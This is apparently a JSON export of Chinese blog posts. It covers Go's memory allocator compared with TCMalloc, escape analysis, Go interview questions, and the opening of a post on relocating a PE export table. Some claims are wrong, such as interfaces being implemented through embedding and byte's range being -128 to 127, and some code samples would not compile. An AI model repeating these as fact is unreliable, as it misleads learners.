struct &#123; spanClass spanClass // 指当前规格大小 partial [2]spanSet // 有空闲object的mspan列表 full [2]spanSet // 没有空闲object的mspan列表&#125; 每个mcentral管理一种spanClass的span, 并将有空闲空间和没有空闲空间的mspan分开管理。partail和full的数据类型为spanSet, 表示mspans集, 可用通过pop、push来获得mspans; 12345678type spanSet struct &#123; spineLock mutex spine unsafe.Pointer // 指向[]span指针 spineLen uintptr // Spine array length, accessed atomically spineCap uintptr // Spine array cap, accessed under lock index headTailIndex // 前32位是头指针, 后32位是尾指针 &#125; 简单说下mcache从mcentral获取和归还mspan的流程: 获取: 加锁, 从partail链表找到一个可用的mspan; 并将其从partail链表删除; 将取出的mspan加入到full链表中; 将mspan返回给工作流程, 解锁; 归还: 加锁, 将mspan从full链表中删除, 将mspan加入到partail链表中, 解锁; 页堆: mheapmheap管理Go所有动态分配内存, 可以认为是Go程序持有整个堆空间, 全局唯一; 123456789101112131415var mheap_ mheaptype mheap struct &#123; lock mutex // 全局锁 pages pageAlloc // 页面分配的数据结构 allspans []*mspan // 所有通过mheap_申请的mspans //堆 arenas [1 &lt;&lt; arenas1Bits]*[1 &lt;&lt; arenas2Bits]*heapArena // 所有中心缓存mcentral central [numSpanClasses]struct &#123; mcentral mcentral pad [cpu.CacheLinePadSize - unsafe.Sizeof(mcentral&#123;&#125;) % cpu.CacheLinePadSize]byte &#125; ...&#125; 所有mcentral的集合则是存放于mheap中的。mheap里的arena区域是堆内存的抽象, 运行时会将8KB看做一页, 这些内存页存储了所有在堆上初始化的对象。运行时使用二维的runtime.heapArena数组管理所有的内存, 每个runtime.heapArena都会管理64MB的内存; 当申请内存时, 依次经过mcache和mcentral都没有可用合适规格的大小内存, 这时候会向mheap申请一块内存。然后按指定规格划分为一些列表, 并将其添加到相同规格大小的mcentral的非空闲列表后面; 分配对象 微对象(0, 16B): 先使用线程缓存上的微型分配器, 再依次尝试线程缓存、中心缓存、堆 分配内存; 小对象(16B, 32KB): 一次尝试线程缓存、中心缓存、堆 分配内存; 大对象(32KB, +∞): 直接尝试堆分配内存; 分配流程 首先通过计算使用的大小规格; 然后使用mcache中对应大小规格的块分配; 如果mcentral中没有可用的块, 则向mheap申请, 并根据算法找到最合适的mspan; 如果申请到的mspan超出申请大小, 将会根据需求进行切分, 以返回用户所需的页数, 剩余的页构成一个新的mspan放回mheap的空闲列表中; 如果mheap中没有可用的span, 则向操作系统申请一系列新的页(最小1MB); Golang内存分配流程 Golang内存管理-其二TCMalloc go内存管理是借鉴了TCMalloc的设计思想, TCMalloc全称Thread-Caching Malloc, 是Google开发的内存分配器。 TCMalloc Page操作系统对内存管理以页为单位, TCMalloc也是这样, 只不过TCMalloc里的Page大小与操作系统大小并不一定相等, 而是倍数关系; Span一组连续的Page被称为Span, 比如可以有4个页大小的Sapn, 也可以有8个页大小的Span, Span比Page高一个层级, 是为了方便管理一定大小的内存区域, Span是TCMalloc中内存管理的基本单位; ThreadCache每个线程各自的Cache, 一个Cache包含多个空闲内存块链表, 每个链表连接的都是内存块, 同一个链表上的内存块的大小是相同的, 也可以说按内存块大小给内存块分了个类, 这样可以根据申请的内存大小, 快速从合适的链表选择空闲内存块, 由于每个线程有自己的ThreadCache, 所以ThreadCache访问是无锁的; CentalCache是所有线程共享的缓存, 也是保存的空闲内存块链表, 链表的数量与ThreadCache中链表数量相同, 当ThreadCache内存块不足时, 可以从CentralCache中取; 当ThreadCache内存块多时, 可以放回CentralCache中; 由于CentralCache是共享的, 所有它的访问是要加锁的; PageHeapPageHeap是堆内存的抽象, PageHeap存的也是若干链表, 链表保存的是Span, 当CentralCache没有内存时, 会从PageHeap中取, 把1个Span拆成若干内存块, 添加到对应大小的链表中, 当CentralCache内存多的时候, 会放回PageHeap中; TCMalloc对象分配小对象直接从ThreadCache中分配, 若ThreadCache不够则从CentralCache中获取内存, CentralCache内存不够时再从PageHeap中获取内存, 大对象在PageHeap中选择合适的页组成Span用于存储数据; Go内存管理经过上述对TCMalloc内存管理的描述, 接着看一下Go内存管理架构图 Go内存管理 Page和TCMalloc中的Page相同, 图中最下方浅蓝色长方形代表一个Page; Span与TCMalloc中的Span相同, Span是go内存管理的基本单元, 代码中为mspan, 一组连续的Page组成1个Span, 所以上图一组连续的浅蓝色长方形代表的是一组Page组成的1个Span, 另外, 1个淡紫色长方形为1个Span; mcachemcache与TCMalloc中的ThreadCache类似, mcache保存的是各种大小的Span, 并按Span class分类, 小对象直接从mcache分配内存, 它起到了缓存的作用, 并且可以无锁访问。但mcache与ThreadCache也有不同点, TCMalloc中是每个线程1个ThreadCache, Go中是每个P拥有1个mcache, 因为在Go程序中, 当前最多有GOMAXPROC个线程运行, 所以最多需要GOMAXPROCS个mcache就可以保证各线程对mache的无锁访问, 下图是G, P, M三者之间的关系: GMP模型 mcentralmcentral与TCMalloc中的CentralCache类似, 是所有线程共享的缓存, 需要加锁访问, 它按Span class对Span分类, 串联成链表, 当mcache的某个级别Span的内存被分配光时, 它会向mcentral申请1个当前级别的Span。但mcentral与CentralCache也有不同点, CentralCache是每个级别的Span有1个链表, mcache是给个级别的Span有2个链表; mheapmheap与TCMalloc中的PageHeap类似, 它是堆内存的抽象, 把从OS（系统）申请出的内存页组织成Span, 并保存起来。当mcentral的Span不够用时会向mheap申请, mheap的Span不够用时会向OS申请, 向OS的内存申请是按页来的, 然后把申请来的内存页生成Span组织起来, 同样也是需要加锁访问的。但mheap与PageHeap也有不同点: mhep把Span组织成了树结构, 而不是链表, 并且还是两棵树, 然后把Span分配到heapArena进行管理, 它包含地址映射和Span是否包含指针等位图, 这样做的主要原因是为了更高效的利用内存: 分配、回收和再利用; 学习参考资料 GOLANG ROADMAP · 知识星球 腾讯云开发者","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"Golang内存逃逸","slug":"Golang内存逃逸","date":"2024-03-12T13:56:08.000Z","updated":"2024-03-12T14:47:56.175Z","comments":true,"path":"b731d75e.html","link":"","permalink":"http://example.com/b731d75e.html","excerpt":"什么是内存逃逸在程序中, 每个函数块都会有自己的内存区域来存自己的局部变量(内存占用少)、返回地址、返回值之类的数据, 这一块内存区域有特定的结构和寻址方式, 寻址起来十分迅速, 开销很少。这一块内存地址称为栈, 栈是线级别的, 大小在创建的时候已经确定, 当变量太大的时候, 会”逃逸”到堆上, 这种现象称为内存逃逸, 简单来说, 局部变量通过堆分配和回收, 就叫内存逃逸。","text":"什么是内存逃逸在程序中, 每个函数块都会有自己的内存区域来存自己的局部变量(内存占用少)、返回地址、返回值之类的数据, 这一块内存区域有特定的结构和寻址方式, 寻址起来十分迅速, 开销很少。这一块内存地址称为栈, 栈是线级别的, 大小在创建的时候已经确定, 当变量太大的时候, 会”逃逸”到堆上, 这种现象称为内存逃逸, 简单来说, 局部变量通过堆分配和回收, 就叫内存逃逸。 内存逃逸的危害 堆是一块没有特定结构, 也没有固定大小的内存区域, 可以根据需要进行调整。全局变量, 占用较大的局部变量, 函数调用结束后不能立刻回收的局部变量就会存在堆里面。变量在堆上的分配和回收都比在栈上开销大的多。对于go这种带GC的语言来说, 会增加GC压力, 同时容易造成内存碎片。 如何分析程序是否发生内存逃逸 build时添加-gcflags=&quot;-m&quot;选项可分析内存逃逸情况。比如输出./main.go:3:6: moved to heap: x表示局部变量x逃逸到了堆上。 内存逃逸发生时机1. 向channel发送指针数据 因为在编译时, 不知道channel中的数据会被哪个goroutine接收, 因此编译器没法知道变量什么时候会被释放, 因此只能放到堆中; 1234567891011121314151617package mainfunc main() &#123; ch := make(chan int, 1) x := 5 ch &lt;- 5 // x不发生逃逸, 因为只是复制值 ch1 := make(chan int, 1) y := 5 py := &amp;y ch1 &lt;- py // y逃逸, 因为y地址传入chan中, 编译时无法确定什么时候会被接收, 所以无法在函数返回后回收y&#125;// 输出# command-line-arguments./test_Demo_04.go:5:6: can inline main./test_Demo_04.go:16:2: moved to heap: y 2. 局部变量在函数调用结束后还被其他地方使用 局部变量在函数调用结束后还被其他地方使用, 比如函数返回局部变量指针或闭包中引用包外的值。因为变量的生命周期可能会超过函数周期, 因此只能放入堆中; 123456789101112131415161718192021222324package mainfunc foo() func() &#123; x := 5 // x发生逃逸, 因为在foo调用完成后, 被闭包函数用到, 还不能回收, 只能放到堆上存放 return func() &#123; x += 1 &#125;&#125;func main() &#123; inner := foo() inner()&#125;// 输出# command-line-arguments./test_Demo_04.go:5:6: can inline Foo./test_Demo_04.go:7:9: can inline Foo.func1./test_Demo_04.go:18:14: inlining call to Foo./test_Demo_04.go:7:9: can inline main.Foo.func1./test_Demo_04.go:19:7: inlining call to main.Foo.func1./test_Demo_04.go:6:2: moved to heap: x./test_Demo_04.go:7:9: func literal escapes to heap./test_Demo_04.go:18:14: func literal does not escape 在slice或map中存储指针 比如[]*string, 其后面的数组可能是在栈上分配的, 但其引用的值还是堆上; 12345678910111213package mainfunc main() &#123; var x int x = 10 var ls []*int ls = append(ls, &amp;x) // x发生逃逸, ls存储的是指针, 所以ls底层的数组虽然在栈上存储, 但本身却逃逸到堆上&#125;// 输出# command-line-arguments./test_Demo_04.go:5:6: can inline main./test_Demo_04.go:11:6: moved to heap: x 4. 切片扩容 切片扩容后长度太长, 导致栈空间不足, 逃逸到堆上; 12345678910111213package mainfunc main() &#123; s := make([]int, 10000, 10000) for index, _ := range s &#123; s[index] = index &#125;&#125;// 输出# command-line-arguments./test_Demo_04.go:5:6: can inline main./test_Demo_04.go:11:11: make([]int, 10000) escapes to heap 5. 在interface类型上调用方法 在interface类型上调用方法时会把interface变量使用堆分配, 因为方法的真正实现只能在运行时知道; 12345678910111213141516171819202122package maintype foo interface &#123; fooFunc()&#125;type foo1 struct&#123;&#125;func (f1 foo1) fooFunc() &#123;&#125;func main() &#123; var f foo1 f = foo1&#123;&#125; f.fooFunc() // 调用方法时, f发生逃逸, 因为方法是动态分配的&#125;// 输出# command-line-arguments./test_Demo_04.go:12:6: can inline foo1.fooFunc./test_Demo_04.go:16:6: can inline main&lt;autogenerated&gt;:1: inlining call to foo1.fooFunc./test_Demo_04.go:18:10: foo1&#123;&#125; escapes to heap 避免内存逃逸的方法 对于小型数据, 使用传值而不是传指针, 避免内存逃逸; 避免使用长度不固定的slice切片, 在编译期无法确定切片长度, 只能将切片使用堆分配; interface调用方法会发生内存逃逸;","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"Golang八股文汇总","slug":"Golang八股文汇总","date":"2024-02-17T13:10:13.000Z","updated":"2024-03-05T15:44:47.932Z","comments":true,"path":"f25d7e27.html","link":"","permalink":"http://example.com/f25d7e27.html","excerpt":"记录Golang面试八股文","text":"记录Golang面试八股文 Go基础init和main函数的相关特点init函数（没有输入参数、返回值）的主要作用: 初始化不能采用初始化表达式初始化的变量; 在程序运行前注册; 实现sync.Once功能; 其他 init顺序 在同一个package中, 可以多个文件中定义init方法; 在同一个go文件中, 可以重复定义init方法; 在同一个package中, 不同文件中的init方法执行按照文件名先后执行各个文件中的init方法; 在同一个文件中的多个init方法, 按照在代码中编写的顺序依次执行不同的init方法; 对于不同的package, 如果不相互依赖的话, 按照main包中import的顺序调用其包中的init()函数; 如果package存在依赖, 调用顺序为最后被依赖的最先被初始化, 例如: 导入顺序main -&gt; A -&gt; B -&gt; C, 则初始化顺序为C -&gt; B -&gt; A -&gt; main, 一次执行对应的init方法; Golang-init函数执行顺序 Golang的数据结构的零值是什么?所有整型类型: 0浮点类型: 0.0布尔类型: false字符串类型: “”指针、interface、切片(slice)、channel、map、function: nilGo的零值初始是递归的, 即数组、结构体等类型的零值初始化就是对其组成元素逐一进行零值初始化 byte和rune有什么区别rune和byte在Go语言中都是字符类型, 且都是别名类型;byte型本质上是uint8类型的别名, 代表了ASCII码的一个字符;rune型本质上是int32型的别名, 代表一个UTF-8字符; Go struct 能不能比较需要根据具体情况分析, 如果struct中含有不能被比较的字段类型, 就不能被比较;如果struct中所有的字段类型都支持比较, 那么就支持比较; 不能被比较的类型slice, 因为slice是引用类型, 除非是和nil比较;map, 和slice同理, 如果要比较两个map只能通过循环遍历实现;函数类型; 注意结构体之间只能比较它们是否相等, 而不能比较它们的大小;只能所有属性相等而且属性顺序一致的结构体才能进行比较; Go import的三种方式加下划线import下划线（如：_ “github.com&#x2F;xxx&#x2F;xxx”）的作用: 当导入一个包时, 该包下的文件里所有的init()函数都会被执行。然而有些时候我们并不需要把整个包都导入进来, 仅仅是希望它执行init()函数而已。这个时候就可以使用import _引用该包。即: 使用[import _ 包路径]只是引用该包, 仅仅是为了调用init函数, 所以无法通过包名来调用包中的其他函数; 加点(.)import和引用的包名之间加点（.）操作的含义就是这个包导入之后在调用这个包的函数时, 可以省略前戳的包名; 别名别名操作可以把包命名成另一个用起来容易记忆的名字; Golang的常量地址123456789const i = 100var j = 123func main() &#123; fmt.Println(&amp;j, j) fmt.Println(&amp;i, i) // panic // Go语言中, 常量无法寻址, 是不能进行取指针操作的&#125; string和[]byte如何取舍string擅长的场景:需要字符串比较的场景;不需要nil字符串的场景; []byte擅长的场景修改字符串的场景, 尤其是修改粒度为1个字节;函数返回值, 需要用nil表示含义的场景;需要切片操作的场景; 字符串转成byte数组, 会发生内存拷贝吗 字符串转成切片, 会产生拷贝。严格来说, 只要是发生类型强化转都会发生内存拷贝。频繁的内存拷贝操作听起来对性能不太友好。有没有什么办法可以在字符串转成切片的时候不用发生拷贝呢? 代码实现1234567891011121314package mainimport ( &quot;fmt&quot; &quot;reflect&quot; &quot;unsafe&quot;)func main() &#123; a := &quot;aaa&quot; ssh := *(*reflect.StringHeader)(unsafe.Pointer(&amp;a)) b := *(*[]byte)(unsafe.Pointer(&amp;ssh)) fmt.Printf(&quot;%v&quot;, b)&#125; 解释 StringHeader是字符串在go的底层结构 1234type StringHeader struct &#123; Data uintptr Len int&#125; SliceHeader是切片在go的底层结构 12345type SliceHeader struct &#123; Data uintptr Len int Cap int&#125; 那么如果想要在底层转换二者, 只需要把StringHeader的地址强转成SliceHeader就行。那么go有个包很强的包叫unsafe。 unsafe.Pointer(&amp;a)方法可以得到变量a的地址; (*reflect.StringHeader)(unsafe.Pointer(&amp;a))可以把字符串a转成底层结构的形式; (*[]byte)(unsafe.Pointer(&amp;ssh))可以把ssh底层结构转成byte的切片的指针; 再通过*转成指针指向的实际内容; 翻转含有中文、数字、英文字符的字符串 翻转含有中文、数字、英文字母的字符串 代码实现12345678910111213141516package mainimport &quot;fmt&quot;func main() &#123; src := &quot;你好abc啊哈哈&quot; dst := reverse([]rune(src)) fmt.Printf(&quot;%v\\n&quot;, string(dst))&#125;func reverse(s []rune) []rune &#123; for i, j := 0, len(s)-1;i&lt;j; i,j = i+1, j-1 &#123; s[i], s[j] = s[j], s[i] &#125; return s&#125; 解释 rune关键字, 从golang源码中看出, 它是int32的别名(-2^31 ~ 2^31-1), 比如byte(-128 ~ 127), 可表示更多的字符。 由于rune可表示的范围更大, 所以能处理一切字符, 当然也包括中文字符。在平时计算中文字符, 可用rune。 因此将字符串转成rune的切片, 再进行翻转; json包变量不加tag会怎么样? json包里使用的时候, 结构体里的变量不加tag能不能正常转成json里的字段? 回答 如果变量首字母小写, 则为private。无论如何不能转, 因为取不到反射信息。 如果变量首字母大写, 则为public: 不加tag, 可以正常转为json里的字段, json内字段名跟结构体内字段原名一致; 加了tag, 从struct转json的时候, json的字段名就是tag里的字段名, 原字段名已经没用; 代码示例12345678910111213141516171819202122232425package mainimport ( &quot;encoding/json&quot; &quot;fmt&quot;)type J struct &#123; a string // 小写无tag b string `json:&quot;B&quot;` // 小写加tag C string // 大写无tag D string `json:&quot;DD&quot;` // 大写加tag&#125;func main() &#123; j := J &#123; a: &quot;1&quot;, b: &quot;2&quot;, C: &quot;3&quot;, D: &quot;4&quot;, &#125; fmt.Printf(&quot;转为json前j结构体的内容 = %+v\\n&quot;, j) // 转为json前j结构体的内容 = &#123; a:1 b:2 C:3 D:4 &#125; jsonInfo, _ := json.Marshal(j) fmt.Printf(&quot;转为json后的内容 = %+v\\n&quot;, string(jsonInfo)) // 转为json后的内容 = &#123; &quot;C&quot;: &quot;3&quot;, &quot;DD&quot;: &quot;4&quot; &#125;&#125; 解释 结构体里定义了四个字段, 分别对应小写无tag, 小写加tag、大写无tag、大写加tag; 转为json后首字母小写的不管加不加tag都不能转为json里的内容, 而大写的加了tag可以取别名, 不加tag则json内的字段跟结构体字段原名一致; Go语言中cap函数可以作用于哪些内容? array返回数组的元素个数 slice返回slice的最大容量 channel返回chennel的容量 Go语言的引用类型有什么? Go语言中的引用类型有func(函数类型)、interface(接口类型)、slice(切片类型)、map(字典类型)、channel(管道类型)、*(指针类型) for-select, 如果通道已经关闭会怎么样?如果select中只有一个case呢? for循环select时, 如果通道已经关闭会怎么样?如果select中的case只有一个, 又会怎么样? 回答 for循环select时, 如果其中一个case通道已经关闭, 则每次都会执行到这个case; 如果select里边只有一个case, 而这个case被关闭了, 则会出现死循环; 解释 for循环里被关闭的通道1234567891011121314151617181920212223242526272829package mainimport ( &quot;fmt&quot; &quot;time&quot;)const ( fmat = &quot;2006-01-02 15:04:05&quot;)func main() &#123; c := make(chan int) go func() &#123; time.Sleep(1 * time.Second) c &lt;- 10 close(c) &#125;() for &#123; select &#123; case x, ok := &lt;-c: fmt.Printf(&quot;%v, 通道读取到: x=%v, ok=%v\\n&quot;,time.Now().Format(fmat) x, ok) time.Sleep(500 * time.Millisecond) default: &#125; &#125;&#125; 输出结果123456789101112131415162024-02-27 22:29:44, 没读到信息进入default2024-02-27 22:29:44, 没读到信息进入default2024-02-27 22:29:45, 通道读取到: x=10, ok=true2024-02-27 22:29:45, 通道读取到: x=0, ok=false2024-02-27 22:29:46, 通道读取到: x=0, ok=false2024-02-27 22:29:46, 通道读取到: x=0, ok=false2024-02-27 22:29:47, 通道读取到: x=0, ok=false2024-02-27 22:29:47, 通道读取到: x=0, ok=false2024-02-27 22:29:48, 通道读取到: x=0, ok=false2024-02-27 22:29:48, 通道读取到: x=0, ok=false2024-02-27 22:29:49, 通道读取到: x=0, ok=false2024-02-27 22:29:49, 通道读取到: x=0, ok=false2024-02-27 22:29:50, 通道读取到: x=0, ok=false2024-02-27 22:29:50, 通道读取到: x=0, ok=false2024-02-27 22:29:51, 通道读取到: x=0, ok=false2024-02-27 22:29:51, 通道读取到: x=0, ok=false c通道是一个缓冲为0的通道, 在main开始时, 启动一个协程对c通道写入10, 然后就关闭掉这个通道; 在main中通过通过x, ok := &lt;-c接受通道c里的值, 从输出结果里看出, 确实从通道里读出了之前塞入通道的10, 但是这个通道关闭后, 这个通道一直能读出内容; 怎样才能不读关闭后的通道123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;fmt&quot; &quot;time&quot;)const ( fmat = &quot;2006-01-02 15:04:05&quot;)func main() &#123; c := make(chan int) go func() &#123; time.Sleep(1 * time.Second) c &lt;- 10 close(c) &#125;() for &#123; select &#123; case x, ok := &lt;-c: fmt.Printf(&quot;%v, 通道读取到: x=%v, ok=%v\\n&quot;, time.Now().Format(fmat), x, ok) time.Sleep(500 * time.Millisecond) if !ok &#123; c = nil // 把关闭后的通道赋值为nil, 则select读取则会阻塞 &#125; default: fmt.Printf(&quot;%v, 没读到信息进入default\\n&quot;, time.Now().Format(fmat)) time.Sleep(500 * time.Millisecond) &#125; &#125;&#125; 输出结果123456789102024-02-27 23:08:06, 没读到信息进入default2024-02-27 23:08:07, 没读到信息进入default2024-02-27 23:08:07, 通道读取到: x=10, ok=true2024-02-27 23:08:08, 通道读取到: x=0, ok=false2024-02-27 23:08:08, 没读到信息进入default2024-02-27 23:08:09, 没读到信息进入default2024-02-27 23:08:09, 没读到信息进入default2024-02-27 23:08:10, 没读到信息进入default2024-02-27 23:08:10, 没读到信息进入default2024-02-27 23:08:11, 没读到信息进入default go的内存逃逸是什么? 什么情况下会发生内存逃逸?回答golang程序变量会携带有一组校验数据, 用来证明它的整个生命周期是否在运行时完全可知。如果变量通过了这些校验, 它就可以在栈上分配, 否则就说它逃逸了, 必须在堆上分配。 能引起变量逃逸到堆上的典型情况: 在方法内把局部变量指针返回: 局部变量原本应该在栈中分配, 在栈中回收。但是由于返回时被外部调用, 因此其生命周期大于栈, 则溢出; 发送指针或带有指针的值到chennel中: 在编译时, 是没有办法知道哪个goroutinue会在channel上接收数据。所以编译器没法知道变量什么时候才会释放; 在一个切片上存储指针或带指针的值: 一个典型的例子就是[]*string。这会导致切片内容逃逸。尽管其后面的数组可能是在栈上分配的, 但其引用的值一定是在堆上; slice的背后数组被重新分配了, 因为append时可能会超出其容量(cap): slice初始化的地方在编译时是可以知道的, 它最开始会在栈上分配。如果切片背后的存储要基于运行时的数据进行扩充, 就会在堆上分配; 在interface类型上调用方法: 在interface类型上调用方法都是动态调度的–方法的真正实现只能在运行时知道。想象一个io.Reader类型的变量r, 调用r.Read(b)会使得r的值和切片b背后存储的数据逃逸掉, 所以会在堆上分配; 代码举例 通过一个例子加深理解, 接下来尝试怎么通过go build -gcflags=-m查看逃逸的情况 123456789101112131415161718192021package mainimport &quot;fmt&quot;type A struct &#123; s string&#125;func foo(s string) *A &#123; a := new(A) a.s = s return a // 返回局部变量a, 在C语言为野指针, 在golang则ok但a会逃逸到堆&#125;func main() &#123; a := foo(&quot;hello&quot;) b := a.s + &quot;world&quot; c := b + &quot;!&quot; fmt.Println(c)&#125; 执行go build -gcflags=-m test_Demo_01.go 123456789101112go build -gcflags=-m test_Demo_01.go# command-line-arguments./test_Demo_01.go:9:6: can inline foo./test_Demo_01.go:16:10: inlining call to foo./test_Demo_01.go:20:13: inlining call to fmt.Println./test_Demo_01.go:9:10: leaking param: s./test_Demo_01.go:10:10: new(A) escapes to heap./test_Demo_01.go:16:10: new(A) does not escape./test_Demo_01.go:17:11: a.s + &quot;world&quot; does not escape./test_Demo_01.go:18:9: b + &quot;!&quot; escapes to heap./test_Demo_01.go:20:13: ... argument does not escape./test_Demo_01.go:20:14: c escapes to heap ./test_Demo_01.go:10:10: new(A) escapes to heap说明new(A)逃逸了, 符合上述提到的常见情况的第一种; ./test_Demo_01.go:17:11: a.s + &quot;world&quot; does not escape 说明b变量没有逃逸, 因为它只存在方法内存中, 会在方法结束时被回收; ./test_Demo_01.go:18:9: b + &quot;!&quot; escapes to heap说明c变量逃逸, 通过fmt.Println(a ...interface&#123;&#125;)打印的变量, 都会发生逃逸; Go关键字fallthrough有什么作用 fallthrough关键字只能用在switch中, 且只能在每一个case分支中的最后一行, 作用是如果这个case分支被执行, 将继续执行下一个case分支, 而且不会取判断下一个分支额case条件是否成立; 12345678910111213141516171819202122package mainimport mainfunc main() &#123; switch &quot;a&quot; &#123; case &quot;a&quot; fmt.Println(&quot;匹配a&quot;) fallthrough case &quot;b&quot;: fmt.Println(&quot;a成功了, 也执行b分支&quot;) case &quot;c&quot;: fmt.Println(&quot;a成功了, c分支会执行吗&quot;) default: fmt.Println(&quot;默认执行&quot;) &#125;&#125;/** 匹配a a成功了, 也执行b分支 */ 空结构体占不占内存空间? 为什么使用空结构体? 空结构体是没有内存大小的结构体; 通过unsafe.Sizeof()可以查看空结构体的宽度, 代码如下: 12var s struct&#123;&#125;fmt.Println(unsafe.Sizeof(s)) // printfs 0 准确的来说, 空结构体有一个特殊起点: zerobase变量; zerobase是一个占用8个字节的uintptr全局变量。每次定义struct&#123;&#125;类型的变量, 编译器只是把zerobase变量的地址给出去。也就是说空结构体的变量的内存地址都是一样的。 空结构体的使用场景主要有三种: 实现方法接收者: 在业务场景下, 我们需要将方法组合起来, 代表其一个”分组”的, 便于后续拓展和维护; 实现集合类型: 在Go语言的标准库中并没有提供集合(Set)的相关实现, 因此一般在代码中图方便, 会直接用map来替代: type Set map[string]struct&#123;&#125;。 实现通道: 在Go channel的使用场景中, 常常会遇到通知型channel, 其不需要发送任何数据, 只是用于协调Goroutinue的运行, 用于流转各类状态或是控制并发情况; Go语言中, 下面哪个关于指针的说法是错误的? 指针不能进行算术运算 指针可以比较 指针可以是nil 指针可以指向任何类型 针对在Go语言中只能指向相同类型的结构体或者基本类型。例如，一个int类型的变量, 只能指向int类型的指针。如果尝试将一个不同类型的指针赋给一个变量, 将会导致编译错误。 Go语言的接口类型是如何实现的? 在Go语言中, 接口类型是通过**类型嵌入(embedding)**的方式实现的。每个实现了接口的类型的结构体中都有一个隐含的成员, 该成员是指向接口类型的指针。通过这种方式, 接口实现了堆类型的约束和定义。 具体来说, 当一个类型实现了某个接口的所有方法后, 该类型就被认为是实现了该接口。结构体中, 可以通过嵌入接口类型的方式来实现接口方法。在实现接口方法时, 方法的签名需要与接口定义中的方法签名保持一致。 Go string的底层实现源码包src&#x2F;runTime&#x2F;string.go stringStruct定义了string的数据结构 1234Type stringStruct struct &#123; str unsafe.Pointer // 字符串的首地址 len int // 字符串的长度&#125; 声明:如下代码所示, 可以声明一个string变量赋予初值 12var str stringstr = &quot;hello world&quot; 字符串构建过程是根据字符串构建stringStruct, 再转化成string, 转化源码如下: 12345678func gostringnocopy(str *byte) string &#123; ss := stringStruct&#123; // 先构造stringStruct str: unsafe.Pointer(str), len: findnull(str) &#125; s := *(*string)(unsafe.Pointer(&amp;ss)) // 再将stringStruct转换成string return s&#125; Go如何避免panic 首先明确panic定义: go把真正的异常叫做panic, 是指出现重大错误, 比如数据越界之类的编程BUG或者是那些需要人工介入才能修复的问题, 比如程序启动时加载资源出错等等。 几个容易出现panic的点: 函数返回值或参数为指针类型, nil, 未初始化结构体, 此时调用容易出现panic, 可加 !&#x3D;nil 进行判断; 数组切片越界 如果我们关闭未初始化通道, 重复关闭通道, 向已经关闭的通道中发送数据, 这三种情况会引发panic, 导致程序崩溃; 如果我们直接操作未初始化的映射(map), 也会引发panic, 导致程序崩溃; 另外, 操作映射可能会遇到的更为严重的一个问题是, 同时对同一个映射并发读写, 它会触发runtime.throw, 不像panic可以使用recover捕获。所以, 我们再对同一个映射并发读写时, 一定要使用锁; 如果类型断言使用不当, 比如我们不接受布尔值的话, 类型断言失败也会引发panic, 导致程序崩溃; 如果很多时候不可避免地出现了panic, 记得使用defer&#x2F;recover; 空结构体的使用场景 空结构体(empty struct)是在Go语言中一个特殊地概念, 它没有任何字段。在Go中, 它通常被称为匿名结构体或零宽度结构体。尽管没有字段, 但它在某些请款下仍然有其他用途 1. 占位符 空结构体可以用作占位符, 用于表示某个数据结构或数据集合地存在而不实际存储任何数据。这在某些数据结构的实现中非常有用, 特别是要实现某种数据结构的集合或映射时, 但并不需要存储实际的值。 123// 表示集合中是否包含某个元素的映射set := make(map[string]struct&#123;&#125;)set[&quot;apple&quot;] = struct&#123;&#125;&#123;&#125; 2. 信号量 空结构体可以用作信号量, 用于控制并发操作。通过向通道发送或接收空结构体, 可以实现信号的传递和同步; 123456789// 用通道作为信号量semaphore := make(chan struct&#123;&#125;, 5) // 控制并发数为5go func() &#123; semaphore &lt;- struct&#123;&#125;&#123;&#125; // 获取信号量 defer func() &#123; &lt;- semaphero &#125;() // 释放信号量 // 执行并发操作&#125;() 3.强调结构 有时, 空结构体可用于强调某个结构的重要性或存在。它可以用作结构体的标签, 表示关注该结构的存在而不是其内容; 1234567// 表示一篇文章的元信息, 不包含实际内容type Article struct &#123; Title string Author string PublishedAt time.Time MetaData struct&#123;&#125; // 空结构体强调元信息的存在&#125; 4. JSON序列化 在处理JSON数据时, 有时需要表示一个空对象, 可以使用空结构体来表示JSON中的空对象&#123;&#125;; 123emptyJSON := struct&#123;&#125;&#123;&#125;jsonBytes, _ := json.Marshal(emptyJSON)fmt.Println(string(jsonBytes)) // 输出: &#123;&#125; 尽管空结构体没有字段, 但它在上述情况下提供了一种轻量级的方式来处理特定的需求, 而无需分配额外的内存或定义具体的数据结构。 struct的特点: 用来自定义复杂数据结构; struct里面可以包含多个字段(属性); struct类型可以定义方法, 注意和函数的区分; struct类型是值类型; struct类型可以嵌套; Go语言没有calss类型, 只有struct类型; 特殊之处: 结构体是用户单独定义的类型, 不能和其他类型进行强制转换; golang中的struct没有构造函数, 一般可以使用工厂模式来解决这个问题; 我们可以为struct的每个字段, 写上一个tag。这个tag可以通过反射的机制获取到, 最常用的场景就是json序列化和反序列化; 结构体中的字段可以没有名字, 即匿名字段;","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"移动导出表","slug":"移动导出表","date":"2024-01-03T12:51:25.000Z","updated":"2024-07-01T15:23:01.410Z","comments":true,"path":"cfe5db75.html","link":"","permalink":"http://example.com/cfe5db75.html","excerpt":"为什么要移动导出表导出表由编译器生成, 导出表中存储了该PE文件有哪些导出函数以及函数的地址;在程序启动时, 系统会根据导出表做初始工作; 将用到的Dll中的函数地址存储到IAT表中;为了保护程序, 可以对.EXE的二进制代码进行加密操作;如果进行加密, 各种表的信息以及数据是混在一起的, 加密后会导致程序无法正常执行;因此需要新增一个节, 并将PE中的表移动到新节中, 然后将代码和数据进行加密;","text":"为什么要移动导出表导出表由编译器生成, 导出表中存储了该PE文件有哪些导出函数以及函数的地址;在程序启动时, 系统会根据导出表做初始工作; 将用到的Dll中的函数地址存储到IAT表中;为了保护程序, 可以对.EXE的二进制代码进行加密操作;如果进行加密, 各种表的信息以及数据是混在一起的, 加密后会导致程序无法正常执行;因此需要新增一个节, 并将PE中的表移动到新节中, 然后将代码和数据进行加密; 移动导出表步骤移动导出表步骤读取Dll文件并在FileBuffer中新增一个节(.export);复制AddressOfFunctions(函数地址表); 长度: NumberOfFunctions * 